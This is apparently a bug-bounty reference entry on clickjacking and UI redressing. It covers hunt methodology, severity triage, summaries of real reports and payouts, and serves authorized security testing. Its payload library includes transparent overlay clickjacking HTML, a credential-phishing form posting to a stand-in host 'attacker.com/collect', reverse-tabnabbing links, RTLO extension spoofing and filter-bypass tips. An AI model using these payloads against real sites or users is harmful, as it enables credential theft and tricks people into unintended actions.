---
category: clickjacking
label: Clickjacking / UI Redressing
report_count: 94
programs: [gitlab, yelp, wordpress, automattic, nextcloud, semrush, legalrobot, wakatime, pixiv, khanacademy]
avg_bounty: 600
max_bounty: 3500
severity_distribution: critical: 1, high: 1, medium: 12, low: 20, none: 3
---

## Overview

Clickjacking breaks the user’s trust in the UI by allowing attackers to overlay or embed sensitive actions or content in a way that tricks users into unintended clicks or data entry. Developers often miss this class due to incomplete or misconfigured frame-busting headers, insufficient markup sanitization, or gaps in CSP. Worst-case impact includes account takeover, sensitive action execution, credential theft, and wormable social propagation.

## Root causes

- Missing or misconfigured `X-Frame-Options` or `Content-Security-Policy: frame-ancestors` headers.
- Overly permissive HTML sanitization in user-generated content, allowing injection of forms, iframes, or overlays.
- Inconsistent application of frame-busting logic across endpoints or flows (e.g., login, settings, embedded widgets).
- Reliance on deprecated or browser-incompatible header values (e.g., `ALLOW-FROM`).
- Failure to sanitize Unicode control characters (e.g., RTLO) that enable content spoofing or extension masking.
- Inadequate handling of third-party integrations or embeddable widgets.

## Attack surface

- Any endpoint rendering sensitive actions (delete, settings, payments) without `X-Frame-Options` or CSP `frame-ancestors`.
- User-generated content features that allow HTML or markup (wikis, notes, comments, blogs).
- Authentication, password reset, and SSO flows.
- Embedded widgets, charts, or dashboards intended for sharing or embedding.
- File sharing or download endpoints, especially where file names/extensions are user-controlled.
- Features using legacy HTML elements (`<frameset>`, `<frame>`, `<object>`, `<embed>`) or allowing raw HTML input.
- Applications built with frameworks that do not enforce frame protection by default (many legacy stacks, some Electron apps).

## Recon checklist

1. Enumerate all endpoints and features that render user-facing UI, especially those with sensitive actions.
2. For each, check HTTP responses for `X-Frame-Options` and `Content-Security-Policy` headers.
3. Identify endpoints that accept or render user-supplied HTML/markup (wikis, notes, comments, custom pages).
4. Review client-side JS for frame-busting logic or anti-framing checks.
5. Test for Unicode control character handling in file names, shared links, and user content.
6. Map all embeddable widgets, charts, or dashboards and their intended embedding restrictions.
7. Review documentation or API schemas for endpoints supporting third-party integrations or sharing.
8. Identify endpoints that differ in protection between authenticated and unauthenticated contexts.

## Hunt methodology

1. For each candidate endpoint, request the page and inspect response headers for `X-Frame-Options` and CSP `frame-ancestors`.
2. Attempt to embed the endpoint in an `<iframe>` or `<frame>` on a separate origin; observe rendering and interaction.
3. Overlay the framed content with transparent or opaque elements to test click redressing.
4. For user-generated content features, attempt to inject HTML forms, iframes, or overlays via allowed markup.
5. Test for reverse tabnabbing by injecting links with `target="_blank"` and missing `rel="noopener noreferrer"`.
6. Attempt to mask file extensions or spoof content using Unicode RTLO or similar control characters.
7. For endpoints with partial frame protection, test browser compatibility and header bypasses (e.g., `ALLOW-FROM` in Chrome).
8. Document any successful UI redressing, sensitive action execution, or credential theft with a minimal PoC.

## Payload library

### Basic iframe embedding
**Technique**: Exploits absence or misconfiguration of frame-busting headers to render sensitive UI in a frame.
**How to apply**: Create an HTML file embedding the target endpoint via `<iframe src="{target_url}"></iframe>`.
**Payload**:
```html
<iframe src="{target_url}" width="800" height="600"></iframe>
```
**Observe**: Target page renders in the frame and is interactable.
**Seen in**: Login pages, account settings, dashboards.

### Overlay clickjacking
**Technique**: Uses CSS to overlay attacker-controlled elements over sensitive actions in a framed target.
**How to apply**: Embed `{target_url}` in an iframe, position a transparent button or div over a sensitive UI element.
**Payload**:
```html
<div style="position:relative;">
  <button style="position:absolute;top:{y}px;left:{x}px;z-index:2;opacity:0;width:{w}px;height:{h}px;">Click</button>
  <iframe src="{target_url}" style="position:absolute;top:0;left:0;z-index:1;width:{w}px;height:{h}px;opacity:0.7;"></iframe>
</div>
```
**Observe**: Clicking the visible button triggers the underlying action in the frame.
**Seen in**: Delete actions, account changes, payment confirmations.

### Form injection in user content
**Technique**: Injects HTML forms into user-editable content to phish credentials or sensitive data.
**How to apply**: Submit a payload containing a `<form>` with action to an attacker-controlled endpoint in a user-editable field.
**Payload**:
```html
<form action="https://attacker.com/collect" method="POST">
  <input type="text" name="username" placeholder="Username">
  <input type="password" name="password" placeholder="Password">
  <input type="submit" value="Login">
</form>
```
**Observe**: Rendered form appears in the application, collects user input.
**Seen in**: Wikis, notes, comments, blog posts.

### Reverse tabnabbing via external links
**Technique**: Leverages links with `target="_blank"` and missing `rel="noopener noreferrer"` to control the opener window.
**How to apply**: Inject or identify a link in user content or templates: `<a href="{attacker_url}" target="_blank">Click me</a>`.
**Payload**:
```html
<a href="https://attacker.com" target="_blank">Open</a>
```
**Observe**: After clicking, attacker page can access `window.opener` and redirect the original tab.
**Seen in**: Markdown/HTML rendering in comments, wikis, documentation.

### Unicode RTLO filename spoofing
**Technique**: Uses Unicode Right-to-Left Override to mask file extensions or spoof content type.
**How to apply**: Upload or share a file with a name containing `\u202e` to reverse extension order.
**Payload**:
`test\u202egnp.exe` (renders as `testexe.png`)
**Observe**: File appears as a benign type but is actually executable or dangerous.
**Seen in**: File sharing, downloads, public links.

### CSP/XFO header bypass via unsupported values
**Technique**: Exploits browser differences or deprecated header values (e.g., `ALLOW-FROM`) to bypass frame restrictions.
**How to apply**: Identify endpoints using `X-Frame-Options: ALLOW-FROM {origin}` and test in browsers that ignore this value.
**Payload**: N/A (header-based)
**Observe**: Endpoint is frameable in browsers like Chrome or Safari.
**Seen in**: OAuth flows, embedded widgets, legacy apps.

### Legacy HTML element embedding
**Technique**: Uses `<frameset>`, `<frame>`, `<object>`, or `<embed>` to bypass iframe-only restrictions.
**How to apply**: Embed `{target_url}` using alternative HTML elements.
**Payload**:
```html
<frameset cols="100%">
  <frame src="{target_url}">
</frameset>
```
**Observe**: Target renders and is interactable in legacy browsers.
**Seen in**: Apps with partial iframe filtering, legacy editors.

## Filter & WAF bypass

- Use `<frameset>` and `<frame>` tags if `<iframe>` is filtered.
- Encode URLs or use data URIs to obfuscate payloads.
- Use Unicode control characters (e.g., `\u202e`) to mask file extensions or content.
- Leverage browser-specific header parsing differences (e.g., `X-Frame-Options: ALLOW-FROM` ignored in Chrome).
- Overlay transparent elements with CSS `opacity:0` or `pointer-events:none` to trick users.
- Use sandboxed iframes with `allow-forms` and `allow-scripts` to bypass some restrictions.

## Verification & impact

- **Confirmed vulnerable**: Target endpoint renders in a frame from a different origin and is interactable; or injected form/overlay appears in user content and collects data.
- **False positive signals**: Endpoint renders but is not interactable (pointer events blocked, UI grayed out); frame-busting JS reliably prevents interaction; headers present but misread due to caching.
- **Impact escalation**: Chain with CSRF for authenticated actions, phish credentials via injected forms, escalate to account takeover via reverse tabnabbing, or propagate wormable actions (e.g., auto-tweeting, mass likes).

## Triage & severity

- **Typical CVSS**: Low to Medium for generic UI redressing; High to Critical if sensitive actions (account deletion, payments) are exposed or credential theft is possible.
- **Severity up**: Authenticated-only endpoints, sensitive actions, credential input, wormable flows, or ability to chain with CSRF.
- **Severity down**: Read-only or public endpoints, sandboxed or non-interactive frames, mitigations in place (e.g., frame-busting JS, pointer-events:none).

## Reporting tips

- Provide a minimal HTML PoC demonstrating framing and interaction.
- For user content injection, show both the input and the rendered output.
- Clearly state the impact: what action can be performed, what data can be stolen, or how the attack can propagate.
- Avoid generic reports—prove interaction or data theft, not just frameability.
- Include screenshots or videos of the exploit in action.
- Checklist: affected endpoint, response headers, PoC code, observed behaviour, impact statement.

## Real examples

- 662287 — gitlab: Improper HTML sanitization in wiki pages allowed full-page overlays and credential phishing via injected forms (high, $3500)
- 591432 — x: Misconfigured X-Frame-Options with unsupported ALLOW-FROM value allowed clickjacking on sensitive account actions (medium, $1120)
- 154963 — x: Missing frame protection on lead generation cards enabled email/username theft via iframe overlay (medium, $0)
- 201848 — yelp: Clickjacking on photo removal endpoint enabled attackers to trick users into deleting their own profile pictures (medium, $0)
- 229170 — nextcloud: RTLO Unicode character in shared file names allowed extension spoofing and potential code execution (medium, $0)
- 291683 — automattic: Crafted iframe injection in note content enabled form-based UI redressing and credential phishing in desktop app (medium, $0)
- 212629 — gitlab: Reverse tabnabbing via unsanitized links in issues/comments enabled opener window control (medium, $0)
- 405342 — bohemia: Multiple endpoints missing frame protection, enabling clickjacking across several game-related domains (medium, $80)
- 2119892 — pixiv: Clickjacking on drawing endpoint enabled fake login overlays and potential account takeover (low, $200)
- 222762 — nextcloud: Critical clickjacking on demo instance, allowing full UI redressing and sensitive action execution (critical, $0)

## Bounty intelligence

Payouts for clickjacking/UI redressing are typically low unless the impact is clearly demonstrated—credential theft, sensitive action execution, or wormable propagation can push bounties into the $1k–$3.5k range. SaaS, productivity, and social platforms pay best when authenticated or high-value actions are exposed. Generic frameability without impact is often marked as informative or N/A; strong PoCs and clear impact statements are essential for higher rewards.